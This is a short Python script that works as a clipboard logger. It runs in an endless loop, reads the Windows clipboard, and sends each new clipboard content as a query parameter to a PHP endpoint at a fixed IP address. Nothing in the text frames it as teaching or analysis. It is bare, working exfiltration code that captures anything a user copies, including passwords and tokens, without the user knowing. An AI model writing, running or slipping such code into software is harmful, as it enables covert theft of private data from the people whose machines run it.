import win32clipboard, time, requests

last = ''

while True:
    win32clipboard.OpenClipboard()
    data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()
    if last != data:
        r = requests.get('http://10.101.200.30/pouet.php', params={'log': data})
        last = data
        time.sleep(10)
